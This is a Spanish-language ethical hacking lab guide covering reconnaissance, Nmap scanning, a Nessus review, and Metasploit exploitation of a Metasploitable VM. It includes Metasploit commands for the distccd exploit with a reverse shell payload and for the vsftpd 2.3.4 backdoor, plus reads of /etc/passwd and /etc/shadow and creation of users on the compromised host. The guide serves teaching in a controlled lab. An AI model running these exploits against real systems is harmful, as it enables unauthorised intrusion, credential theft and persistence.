## 1. OBJETIVOS

- Ejecutar las actividades iniciales de Reconocimiento de un objetivo en Internet para desarrollar
    las actividades de Escaneo de vulnerabilidades y Ethical Hacking.

## 2. TAREAS DEL LABORATORIO

- Resolución de problemas básicos de red: tracert **_y nslookup_**.
- Análisis de Dominios y consultas IP usando networktools.
- Escaneo de puertos usando la herramienta NMAP.
- Escaneo de vulnerabilidades usando la herramienta Nessus.
- Ejecución herramienta Metasploit.

## 3. DESCRIPCIÓN DE LOS EJERCICIOS A REALIZAR

A **_continuación,_** se detallan las instrucciones para la realización de todos los **_ejercicios,_** así como
el enunciado de **_estos_**.

## 3.1 FASE DE RECONOCIMIENTO

Para este primer parte del laboratorio es importante seleccionar una URL sobre la cual pueda hacer
la fase de reconocimiento.

#### WHOIS

**_1._** Desde el navegador Web Acceda a la siguiente URL https://www.broadbandsearch.net/network-
    tools
2. Ingrese a la opción de Ping en línea
**_3._** En el cuadro de texto ingrese el dominio que quiere analizar. De click en el botón Iniciar Ping.
- Adjuntar el resultado de la ejecución del comando.
- ¿Para qué sirve el comando Ping y que ventajas cree que se tiene en al realizar un ping desde
Internet?


**_4._** Seleccione la opción Traceroute y en el cuadro de texto ingrese el dominio **_Seleccionado_**. De
    click en el botón Iniciar Traceroute.
- Adjuntar el resultado de la ejecución de la **opción**.
- ¿Para qué sirve el comando Tracert?
**_5._** Seleccione la opción Búsqueda Whois y en el cuadro de texto ingrese el dominio **_seleccionado_**.
De click en el botón Entregar:
- ¿Para qué sirve el protocolo WhoIs?.
**_6._** Acceda a la URL https://mxtoolbox.com/SuperTool.aspx. Esta Web le permitirá hacer
búsquedas avanzadas a nivel de DNS públicos:


7. Seleccione un dominio diferente al usado hasta el momento
    - ¿Qué respuesta genero la consulta DNS al dominio que usted selección? Adjunte la
       respuesta.

```
Usando el mismo dominio que selecciono, cambie el tipo de consulta por MX..
```
- ¿Qué registros se muestran ahora? Adjunte la respuesta.
- Seleccione dos tipos de consultas (query type) que no se hayan visto hasta el
    momento y explíquelas **brevemente**
**_8._** Vuelva a la página principal y seleccione la opción BLACKLIST:


- Adjunte los resultados de la búsqueda.
- ¿Qué son las listas negras? De ejemplos de otros sitios que puedan ser usados para hacer
    búsquedas de listas negras.

## 3.2 FASE DE ESCANEO

Para esta segunda fase del laboratorio es necesario hacer uso de la Maquina Virtual Metasploitable.
Una vez cargada esta máquina identifique la dirección IP de la misma usando el comando ifconfig:

9. Desde la máquina de Kali Linux ejecute un escaneo sencillo (La IP que se muestra a
    continuación debe ser reemplazada por la IP de la maquina metasploitable usada por cada uno
    de ustedes):


- Realice un análisis de la información generada por la herramienta.
10. Ahora que se conoce el funcionamiento básico de la aplicación es necesario identificar los
métodos de escaneo que podemos implementar. Para ellos complete el siguiente cuadro
describiendo brevemente que consisten los siguientes métodos de escaneo:

```
Item Definición
```
- sS (sondeo TCP SYN) (^)

- sT (sondeo TCP connect())

- sU (sondeos UDP) (^)

- sN; - sF; - sX (sondeos TCP Null, FIN,
y Xmas)

Sondeo Null(-sN) (^)
sondeo FIN (-sF) (^)
sondeo Xmas (-sX) (^)
- sA (sondeo TCP ACK) (^)
- sW (sondeo de ventana TCP) (^)
- sM (sondeo TCP Maimon) (^)

- Adjunte pantallazos de los escaneos ejecutados y de los resultados obtenidos
- Los escaneos de puertos pueden verse afectados si hay dispositivos de seguridad (Firewall,
    IPS/IDS, etc.) protegiendo las infraestructuras informáticas. En tal sentido describa de qué
    forma podemos usar NMAP para evitar un Firewall (cortafuegos). Para ellos describa
    brevemente las opciones que podemos configurar en la herramienta y como funcionaria.
- ¿Qué importancia puede tener el reconocimiento de puertos dentro la fase de Escaneo?.
- Poniéndose en la situación de un atacante, que tipo de ataques consideran ustedes pueden
    llegarse a realizarse con la información levantada hasta el momento.
11. Ahora vamos a analizar un escaneo de vulnerabilidades realizado sobre el servidor
Metasploitable. Para ello debe validar el archivo “Escaneo de Vulnerabilidades.html”
- Cómo funcionan un Escáner de Vulnerabilidades.
- Qué tipo de Escáner se pueden encontrar.
- Mencione algunos ejemplos de Escáneres de Seguridad y describa brevemente su
    funcionalidad.
- ¿Que son las Bases de datos de Vulnerabilidades?
- Que es el Common Vulnerability Scoring System (CVSS).


- Haga un análisis del archivo “Escaneo de Vulnerabilidades.html” indicando que tipo de
    vulnerabilidades se encuentran en el servidor analizado.

## 3.3 FASE DE EXPLOTACION

12. Para realizar la Explotación de las vulnerabilidades identificadas, vamos a hacer uso de la
    aplicación Metasploit. La primera parte de la práctica está asociada a la explotación de la
    vulnerabilidad que se encuentra en el servidor de Pruebas.
13. Determine la IP de la máquina virtual y la IP del servidor de Pruebas. Para este caso usare las
    siguientes IP’s:

### **********Como guía para este laboratorio se asignaran las siguientes

### IP’s. Es probable que las IP’s cambien.*******

```
Servidor Pruebas: 192.168.1.
```
```
Máquina Virtual Kali: 192.168.1.
```
14. Ahora procederemos a realizar la Explotacion de una vulnerabilidad que se encuentra en el
    servidor. Para ello haremos uso de la vulnerabilidad en el servicio distccd.
       - **_Realice un análisis de la vulnerabilidad reportada con el CVE 2004-2687._**
15. Para acceder a Metasploit acceda por Aplicaciones/08- Herramientas de Explotacion/metasploit
    framework

#### .

### 16. Se abrirá la consola de metasploit donde ejecutaremos la actividad:


17. Estando en la consola ejecute una búsqueda para establecer si se encuentra algún exploit
    disponible para el servicio distcc para ello ejecute el siguiente comando:
       - **_Analice cual fue el resultado de la búsqueda y adjunte un pantallazo de la_**
          **_misma._**
18. Una vez se ha identificado que hay un exploit disponible nos disponemos a configurar las
    variables del exploit RHOST, PAYLOAD y LHOST. Para ello realice la siguiente configuración:
       - Inicialmente cargamos el exploit disponible
       - Seguidamente procedemos a establecer el valor de RHOST (Remote host) y damos
          enter. Para este caso vamos a usar la IP 192.168.1.116 (Nota: Es importante validar
          la dirección IP del servidor de pruebas antes de realizar este pasó).
       - Una vez se da enter el sistema nos confirma que se ha ingresado el valor a la
          variable RHOST


- Ahora procedemos a establecer la carga (Payload) del exploit. Para ello ejecutamos
    el comando _set PAYLOAD cmd/unix/reverse_
- Una vez damos enter el sistema nos confirma que se ha configurado la carga del
    exploit
- Por último, procedemos a establecer el valor de LHOST (local host) y damos enter.
    Para este caso vamos a usar la IP de la máquina virtual 192.168.1.118 (Nota: Es
    importante validar la dirección IP de la máquina virtual kali linux).
- Por último ejecutamos el exploit que acabamos de configurar para lo cual
    ejecutamos el comando **_exploit_** tal como se evidencia a continuación.
- En la parte inferior de la consola ejecutamos el siguiente comando:
    **_Whoami_**
- _Adjunte un pantallazo de los resultados obtenidos._
- _Realice un análisis del Ataque efectuado._


19. Ahora que hemos entrado remotamente en el servidor es necesario proceder a enumerar toda
    la información respectiva sobre el mismo. En tal sentido ejecute los siguientes comandos para
    determinar la siguiente información:
       - Determine el nombre del servidor remoto (Use el comando **_hostname_** ). Adjunte
          evidencia del comando ejecutado y haga un análisis de la respuesta obtenida.
       - Determine la configuración de la tarjeta de red del servidor remoto (Use el comando
          **_ifconfig_** ). Adjunte evidencia del comando ejecutado y haga un análisis de la
          respuesta obtenida.
       - Determine los usuarios que se encuentran creados en el servidor remoto (Use el
          comando **_cat /etc/passwd y cat /etc/shadow_** ). Adjunte evidencia del comando
          ejecutado y haga un análisis de la respuesta obtenida.
       - Determine los grupos y usuarios asignados a cada grupo que se encuentran creados
          en el servidor remoto (Use el comando **_getent group_** ). Adjunte evidencia del
          comando ejecutado y haga un análisis de la respuesta obtenida.
       - Trate de genere un usuario de red (adjunte la evidencia).
       - Trate de Generar un Grupo de red (adjunte la evidencia).
       - Asigne el usuario creado al grupo que género (adjunte la evidencia).

Nota: En el siguiente enlace puede validar los comandos Linux requeridos para crear usuarios grupos
y asignar un usuario a un grupo

https://formacion.intef.es/pluginfile.php/37380/mod_imscp/content/1/administracin_de_usuarios_y_
grupos.html

## 3.4 EXPLOTACION DE UNA VULNERABILIDAD USANDO

## METASPLOIT

20. Ahora es requerido que se explote la versión de un servicio que es vulnerable. Para ellos es
    necesario que explote el servicio FTP que se encuentra en el puerto 21

```
Este módulo explota una puerta trasera que se encuentra en el servicio VSFTPD.
```
```
Ejecute los siguientes comandos para hacer sesión:
```
```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit (unix/ftp/vsftpd_234_backdoor) > set rhost 192.168.1.103 (IP del servidor
remoto)
```

```
msf exploit (unix/ftp/vsftpd_234_backdoor) > exploit
```
21. Ahora que tenemos una sesión abierta en el servidor remoto podemos realizar cualquier tipo de
    actividad en el servidor. Es por ello que deben realizarse las siguientes actividades:
       - Genere un usuario de red
       - Genere un Grupo de red.
       - Asigne el usuario creado al grupo que genero

Nota: En el siguiente enlace puede validar los comandos Linux requeridos para crear usuarios grupos
y asignar un usuario a un grupo

https://formacion.intef.es/pluginfile.php/37380/mod_imscp/content/1/administracin_de_usuarios_y_
grupos.html

22. Conteste las siguientes preguntas:
    - Porque en la explotación del punto 20 se logró crear usuarios y grupos sin problemas y en
       la explotación del punto 18 No se logró crear los usuarios y grupos.
